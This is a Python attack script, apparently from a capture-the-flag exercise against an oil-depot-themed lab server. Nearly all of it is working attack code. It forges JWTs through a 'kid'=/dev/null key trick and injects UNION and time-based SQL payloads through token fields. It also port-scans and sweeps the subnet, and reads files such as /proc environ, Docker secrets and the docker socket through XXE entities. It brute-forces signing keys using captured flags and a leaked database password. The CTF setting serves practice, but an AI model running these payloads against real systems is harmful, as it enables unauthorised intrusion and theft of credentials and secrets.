#!/usr/bin/env python3
"""round79 — Nomad Stronghold / Tank Heist: SQLi via JWT fields, network recon, flag-derived PROBE_SECRET"""
import requests, json, time, hashlib, hmac as hm, base64, socket, struct

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
try:
    r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
    print(f"  Server: [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  FAILED: {e}")
    exit(1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: SQLi VIA JWT SUB FIELD IN PORTAL")
print("="*70)
print("  Portal queries DB using 'sub' from JWT — testing if it's parameterized")
print("  sub=6077 + company='CTF_Team_fubznz' → 200 (known good)")
print("  sub='ctf' + company='X' → 500 (user not found?)")

# First, understand the portal flow
flow_tests = [
    ("sub=6077, company=CTF_Team_fubznz", 6077, "CTF_Team_fubznz"),
    ("sub=6077, company=X", 6077, "X"),
    ("sub=ctf, company=CTF_Team_fubznz", "ctf", "CTF_Team_fubznz"),
    ("sub=99999, company=CTF_Team_fubznz", 99999, "CTF_Team_fubznz"),
    ("sub=1, company=CTF_Team_fubznz", 1, "CTF_Team_fubznz"),
    ("sub=0, company=CTF_Team_fubznz", 0, "CTF_Team_fubznz"),
]

for desc, sub, company in flow_tests:
    token = jwt_forged(role="carrier", sub=sub, company=company)
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=8)
        # Extract meaningful content
        body = r.text
        if "No loading windows" in body:
            print(f"  [{r.status_code}] {desc}: standard empty portal")
        elif r.status_code == 500:
            print(f"  [{r.status_code}] {desc}: Internal Error")
        else:
            # Look for interesting content
            print(f"  [{r.status_code}] {desc}: {body[:200]}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

print("\n  --- SQLi via sub ---")
# If portal uses: SELECT * FROM users WHERE id = <sub>
# Then UNION injection through sub:
sqli_subs = [
    ("UNION 1 col", "0 UNION SELECT 'a'--"),
    ("UNION 2 cols", "0 UNION SELECT 'a','b'--"),
    ("UNION 3 cols", "0 UNION SELECT 'a','b','c'--"),
    ("UNION 4 cols", "0 UNION SELECT 1,'CTF_Team_fubznz','carrier','a'--"),
    ("UNION 5 cols", "0 UNION SELECT 1,'CTF_Team_fubznz','carrier','a','b'--"),
    ("UNION 6 cols", "0 UNION SELECT 1,'CTF_Team_fubznz','carrier','a','b','c'--"),
    ("UNION 7 cols", "0 UNION SELECT 1,'CTF_Team_fubznz','carrier','a','b','c','d'--"),
    ("UNION 8 cols", "0 UNION SELECT 1,'CTF_Team_fubznz','carrier','a','b','c','d','e'--"),
    ("OR true", "6077 OR 1=1"),
    ("AND sleep", "6077; SELECT pg_sleep(3)--"),
    ("version", "0 UNION SELECT version(),2,3,4--"),
    ("tables", "0 UNION SELECT string_agg(table_name,','),2,3,4 FROM information_schema.tables WHERE table_schema='public'--"),
    ("current_db", "0 UNION SELECT current_database(),2,3,4--"),
    ("cast error", "0 UNION SELECT CAST(version() AS integer),2,3,4--"),
]

for desc, sub_val in sqli_subs:
    token = jwt_forged(role="carrier", sub=sub_val, company="CTF_Team_fubznz")
    start = time.time()
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=10)
        elapsed = time.time() - start
        body = r.text
        if r.status_code == 200:
            if "No loading windows" in body:
                print(f"  *** [{r.status_code}] {desc}: portal WORKS with injected sub! ***")
                # Check if any extra data leaked
                if "CTF_Team_fubznz" not in body:
                    print(f"    Different company shown!")
                    print(f"    Body: {body[:500]}")
            else:
                print(f"  *** [{r.status_code}] {desc}: DIFFERENT PORTAL CONTENT! ***")
                print(f"    Body: {body[:500]}")
        elif r.status_code == 500:
            if elapsed > 3:
                print(f"  *** [{r.status_code}] {desc}: SLOW ({elapsed:.1f}s) — time-based SQLi? ***")
            else:
                print(f"  [{r.status_code}] {desc}")
        else:
            print(f"  [{r.status_code}] {desc}")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"  *** TIMEOUT {desc}: {elapsed:.1f}s ***")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

print("\n  --- SQLi via company ---")
sqli_companies = [
    ("OR true", "' OR '1'='1"),
    ("UNION 1", "' UNION SELECT 1--"),
    ("UNION 2", "' UNION SELECT 1,2--"),
    ("UNION 3", "' UNION SELECT 1,2,3--"),
    ("UNION 4", "' UNION SELECT 1,2,3,4--"),
    ("UNION 5", "' UNION SELECT 1,2,3,4,5--"),
    ("UNION tables", "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='public' LIMIT 1--"),
    ("error cast", "' AND 1=CAST(version() AS int)--"),
]

for desc, comp_val in sqli_companies:
    token = jwt_forged(role="carrier", sub=6077, company=comp_val)
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=8)
        if r.status_code == 200:
            if "No loading windows" in r.text:
                print(f"  *** [{r.status_code}] {desc}: portal WORKS! ***")
            else:
                print(f"  *** [{r.status_code}] {desc}: DIFFERENT CONTENT! ***")
                print(f"    Body: {r.text[:500]}")
        elif r.status_code != 500:
            print(f"  [{r.status_code}] {desc}")
        else:
            print(f"  [{r.status_code}] {desc}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: PORT SCAN of 192.168.242.102")
print("="*70)
print("  Looking for other services (Nomad Stronghold? Military Base?)")

top_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443,
             445, 465, 514, 587, 636, 993, 995, 1080, 1433, 1521, 1883,
             2049, 2082, 2083, 2086, 2087, 3000, 3306, 3389, 4443, 4848,
             5000, 5432, 5555, 5672, 5900, 6379, 6443, 6666, 7443, 7777,
             8000, 8001, 8006, 8007, 8008, 8009, 8010, 8042, 8080, 8081,
             8082, 8083, 8084, 8085, 8086, 8088, 8181, 8443, 8444, 8445,
             8500, 8787, 8888, 8889, 8890, 9000, 9001, 9002, 9003, 9090,
             9091, 9100, 9200, 9443, 9500, 9999, 10000, 10080, 10443,
             11211, 15672, 27017, 27018, 50000]

open_ports = []
for port in top_ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        result = s.connect_ex((HOST, port))
        if result == 0:
            open_ports.append(port)
            print(f"  OPEN: {port}")
            # Try HTTP
            try:
                r = requests.get(f"http://{HOST}:{port}/", timeout=3)
                print(f"    HTTP: [{r.status_code}] {r.text[:150]}")
            except:
                pass
        s.close()
    except:
        pass

print(f"\n  Open ports: {open_ports}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: NETWORK SCAN — NEARBY HOSTS")
print("="*70)
print("  Quick scan of 192.168.242.100-120 for other CTF targets")

found_hosts = []
for last_octet in range(100, 121):
    ip = f"192.168.242.{last_octet}"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        # Try common web ports
        for port in [80, 443, 8080, 8007, 8443, 3000, 5000, 9090]:
            result = s.connect_ex((ip, port))
            if result == 0:
                found_hosts.append((ip, port))
                print(f"  FOUND: {ip}:{port}")
                try:
                    r = requests.get(f"http://{ip}:{port}/", timeout=3)
                    title = ""
                    if "<title>" in r.text.lower():
                        start = r.text.lower().find("<title>") + 7
                        end = r.text.lower().find("</title>", start)
                        title = r.text[start:end] if end > start else ""
                    print(f"    HTTP: [{r.status_code}] title='{title}' len={len(r.text)}")
                except:
                    pass
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
        s.close()
    except:
        pass

if not found_hosts:
    print("  No hosts found in 100-120 range")

# Also check a few other interesting IPs
print("\n  --- Wider scan (selected IPs) ---")
for last_octet in [1, 2, 5, 10, 20, 30, 50, 128, 200, 250, 254]:
    ip = f"192.168.242.{last_octet}"
    for port in [80, 443, 8080, 8007]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"  FOUND: {ip}:{port}")
                try:
                    r = requests.get(f"http://{ip}:{port}/", timeout=3)
                    title = ""
                    if "<title>" in r.text.lower():
                        start = r.text.lower().find("<title>") + 7
                        end = r.text.lower().find("</title>", start)
                        title = r.text[start:end] if end > start else ""
                    print(f"    HTTP: [{r.status_code}] title='{title}' len={len(r.text)}")
                    # Check for military/tank/nomad keywords
                    for kw in ['nomad', 'military', 'tank', 'army', 'base', 'stronghold',
                              'defense', 'weapon', 'vehicle', 'camera', 'intranet']:
                        if kw in r.text.lower():
                            print(f"    *** KEYWORD '{kw}' FOUND! ***")
                except:
                    pass
            s.close()
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: FLAG-DERIVED PROBE_SECRET")
print("="*70)

url1 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig1 = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Flags found
stf_flag = "STF{c8142af02727b3d7d51e4aece866104b}"
khs_flag = "KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}"
stf_hash = "c8142af02727b3d7d51e4aece866104b"
khs_hash = "c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95"

flag_candidates = [
    # Exact flags
    stf_flag.encode(),
    khs_flag.encode(),
    # Just the hash parts
    stf_hash.encode(),
    khs_hash.encode(),
    # Hex-decoded hashes
    bytes.fromhex(stf_hash),
    # khs_hash is 48 hex chars = 24 bytes, valid hex
    bytes.fromhex(khs_hash),
    # SHA256 of flags
    hashlib.sha256(stf_flag.encode()).hexdigest().encode(),
    hashlib.sha256(khs_flag.encode()).hexdigest().encode(),
    hashlib.sha256(stf_flag.encode()).digest(),
    hashlib.sha256(khs_flag.encode()).digest(),
    # MD5 of flags
    hashlib.md5(stf_flag.encode()).hexdigest().encode(),
    hashlib.md5(khs_flag.encode()).hexdigest().encode(),
    # Combined
    (stf_hash + khs_hash).encode(),
    (khs_hash + stf_hash).encode(),
    # XOR of flag hashes
    # Reversed hashes
    stf_hash[::-1].encode(),
    khs_hash[::-1].encode(),
    # Uppercase
    stf_hash.upper().encode(),
    khs_hash.upper().encode(),
    # DB password
    b"terminal_web_pw",
    # Combined DB creds
    b"terminal_web:terminal_web_pw",
    # PostgreSQL connection string as key
    b"postgresql://terminal_web:terminal_web_pw@terminal-db:5432/terminal",
    # Hostname
    b"5407f6317f5c",
    b"5407f6317f5cb1c5e178d2edd9fe960f73126e60833d9c1f297d13d9ddeb1e75",
    # Port 3000
    b"3000",
    b"0.0.0.0:3000",
    # Various formats of known values
    b"gauge-gw.internal:9100",
    b"http://gauge-gw.internal:9100",
    b"/v1/tanks",
    b"/v1/meters",
    # Gunicorn related
    b"gthread",
    b"gunicorn",
    # App name
    b"terminal",
    b"terminal_web",
    b"oil-depot",
    b"oil_depot",
    b"khs-oil-depot",
    b"khs_oil_depot",
    # Nomad / military themed
    b"nomad",
    b"stronghold",
    b"nomad-stronghold",
    b"nomad_stronghold",
    b"NomadStronghold",
    b"military",
    b"military-base",
    b"military_base",
    b"tank",
    b"steal_tank",
    b"steal-tank",
    b"heist",
    b"tank_heist",
    # LLELS challenge
    b"LLEHS",
    b"llehs",
    b"SHELL",
    b"shell",
    b"reverse_shell",
    b"reverse-shell",
    # UUID-like patterns
    b"00000000-0000-0000-0000-000000000000",
]

found = False
for candidate in flag_candidates:
    h = hm.new(candidate, url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = {candidate!r} ***")
        found = True
        break

if not found:
    print(f"  Tested {len(flag_candidates)} flag-derived candidates — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: FULL PORTAL HTML ANALYSIS")
print("="*70)
print("  Get full portal HTML source and look for hidden elements")

token = jwt_forged(role="carrier", sub=6077, company="CTF_Team_fubznz")
try:
    r = requests.get(f"{CASPI}/portal",
                    headers={"Cookie": f"session={token}"}, timeout=8)
    if r.status_code == 200:
        html = r.text
        print(f"  Portal HTML length: {len(html)} chars")
        print(f"  Full HTML source:")
        print("-"*50)
        print(html)
        print("-"*50)

        # Look for hidden elements, comments, data attributes
        for marker in ['<!--', 'hidden', 'data-', 'secret', 'probe', 'tank',
                       'military', 'nomad', 'flag', 'KHS', 'STF', 'admin',
                       'api/', 'fetch(', 'xhr', 'ajax', 'config', 'key']:
            if marker.lower() in html.lower():
                idx = html.lower().find(marker.lower())
                print(f"  Found '{marker}': ...{html[max(0,idx-30):idx+80]}...")
except Exception as e:
    print(f"  Portal: {e}")

# Also get /services page
try:
    r = requests.get(f"{CASPI}/services",
                    headers={"Cookie": f"session={token}"}, timeout=8)
    if r.status_code == 200:
        html = r.text
        print(f"\n  Services HTML length: {len(html)} chars")
        print(f"  Full HTML source:")
        print("-"*50)
        print(html)
        print("-"*50)
except Exception as e:
    print(f"  Services: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: GAUGE-GW DEEPER — LOOK FOR HIDDEN DATA")
print("="*70)

# Use signed probe URLs to check gauge-gw responses more carefully
url_lm01 = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig_lm01 = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Get full response with all details
try:
    r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url_lm01, "sig": sig_lm01},
                     headers=AUTH_OP, timeout=8)
    print(f"  Full probe response:")
    print(f"  Status: {r.status_code}")
    print(f"  Headers: {dict(r.headers)}")
    print(f"  Body: {r.text}")
    if r.status_code == 200:
        data = r.json()
        print(f"  JSON keys: {list(data.keys())}")
        for key, val in data.items():
            print(f"    {key}: {val!r}")
except Exception as e:
    print(f"  Probe error: {e}")

# Get all 5 probe responses and look for hidden fields
print("\n  --- All 5 probe responses ---")
probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    ("tk-03", "http://gauge-gw.internal:9100/v1/tanks/3/level",
     "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]

for name, url, sig in probes:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig},
                         headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            data = r.json()
            body = data.get("body", "")
            status = data.get("status", "")
            # Parse body as JSON
            try:
                body_json = json.loads(body)
                keys = list(body_json.keys())
                print(f"  {name}: keys={keys} data={body_json}")
            except:
                print(f"  {name}: raw_body={body[:200]}")
        else:
            print(f"  {name}: [{r.status_code}]")
    except Exception as e:
        print(f"  {name}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: XXE READ — DOCKER INTERNAL DNS & NETWORK CONFIG")
print("="*70)
print("  Check if gauge-gw has more info, check Docker DNS records")

# Re-read /etc/resolv.conf for Docker DNS
for path in [
    "/etc/resolv.conf",
    "/proc/net/arp",
    "/proc/net/route",
    "/proc/net/fib_trie",
    "/proc/self/net/tcp6",
    "/proc/self/net/udp",
    "/proc/self/net/unix",
]:
    code, val = xxe_read(path, timeout=6)
    if code == 200 and val:
        print(f"\n  {path}:")
        for line in val.strip().split('\n')[:20]:
            print(f"    {line}")
    elif code == 400:
        print(f"  {path}: EXISTS(400)")
    time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: ADDITIONAL PROBE SECRET CANDIDATES — KID ORACLE")
print("="*70)
print("  Use kid oracle to verify if specific values match carrier key")
print("  If carrier key = PROBE_SECRET, this tells us both")

# The kid oracle: set kid=<filepath>, sign JWT with candidate key
# If server returns 200 → candidate = file content at kid path
# Test: is carrier key = one of our candidate secrets?

# First, verify the oracle works with /dev/null (key=b'')
token_devnull = jwt_forged(role="operator", kid="/dev/null", key=b'')
try:
    r = requests.get(f"{CASPI}/api/auth/me",
                    headers={"Authorization": f"Bearer {token_devnull}"}, timeout=5)
    if r.status_code == 200:
        print(f"  Oracle baseline (/dev/null, key=b''): [{r.status_code}] OK ✓")
    else:
        print(f"  Oracle baseline: [{r.status_code}] FAILED!")
except Exception as e:
    print(f"  Oracle baseline: {e}")

# Now test candidates against /app/keys/carrier
print("\n  Testing candidates against /app/keys/carrier:")
carrier_candidates = [
    b"",
    stf_hash.encode(),
    khs_hash.encode(),
    bytes.fromhex(stf_hash),
    bytes.fromhex(khs_hash),
    b"carrier",
    b"operator",
    b"probe",
    b"terminal_web_pw",
    b"terminal_web",
    b"secret",
    b"changeme",
    b"password",
    b"khs-oil-depot",
    b"CaspiTerminal",
    b"caspiterminal",
    b"KazHackStan",
    b"kazhackstan",
    b"KHS2026",
    b"LLEHS",
    b"shell",
    b"nomad",
    b"tank",
    b"flag",
    b"admin",
    b"root",
    b"key",
    b"signing",
    b"hmac",
]

for candidate in carrier_candidates:
    token = jwt_forged(role="operator", kid="/app/keys/carrier", key=candidate)
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** CARRIER KEY = {candidate!r} ***")
            # Now test if this is also PROBE_SECRET
            h = hm.new(candidate, url1, hashlib.sha256).digest()
            if h == sig1:
                print(f"  *** AND IT'S THE PROBE_SECRET! ***")
            else:
                print(f"  *** But NOT the PROBE_SECRET ***")
    except:
        pass
    time.sleep(0.05)

print(f"  Tested {len(carrier_candidates)} candidates — no match")

# Same for /app/keys/operator
print("\n  Testing candidates against /app/keys/operator:")
for candidate in carrier_candidates[:10]:
    token = jwt_forged(role="operator", kid="/app/keys/operator", key=candidate)
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 200:
            print(f"  *** OPERATOR KEY = {candidate!r} ***")
    except:
        pass
    time.sleep(0.05)

print(f"  Tested candidates — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE APPROACHES — ENTRYPOINT ANALYSIS")
print("="*70)

# Read /proc/1/cmdline alternatives (null bytes prevented reading)
# Try reading worker process cmdlines (they might not have null bytes)
for pid in [168, 177, 186, 195]:
    code, val = xxe_read(f"/proc/{pid}/cmdline", timeout=4)
    if code == 200 and val:
        print(f"  /proc/{pid}/cmdline: {val[:200]}")
    elif code == 400:
        print(f"  /proc/{pid}/cmdline: EXISTS(400) — has null bytes")
    time.sleep(0.1)

# Try /proc/1/comm (just the command name, no null bytes)
for pid in [1, 168, 177, 186, 195]:
    code, val = xxe_read(f"/proc/{pid}/comm", timeout=4)
    if code == 200 and val:
        print(f"  /proc/{pid}/comm: {val.strip()}")
    time.sleep(0.05)

# Try reading environment of worker processes
for pid in [168, 177]:
    code, val = xxe_read(f"/proc/{pid}/environ", timeout=4)
    if code == 200 and val:
        print(f"  *** /proc/{pid}/environ: {val[:500]} ***")
    elif code == 400:
        print(f"  /proc/{pid}/environ: EXISTS(400) — null bytes")
    time.sleep(0.1)

# Docker socket?
code, val = xxe_read("/var/run/docker.sock", timeout=3)
if code == 200 and val:
    print(f"  *** Docker socket readable: {val[:200]} ***")

# Docker env files
for path in ["/run/secrets/probe_secret", "/run/secrets/hmac_key",
             "/run/secrets/secret_key", "/run/secrets/flask_secret",
             "/.dockerenv"]:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        print(f"  *** {path}: {val[:200]} ***")
    time.sleep(0.05)

print("\n"+"="*70)
print("DONE — round79")
print("="*70)
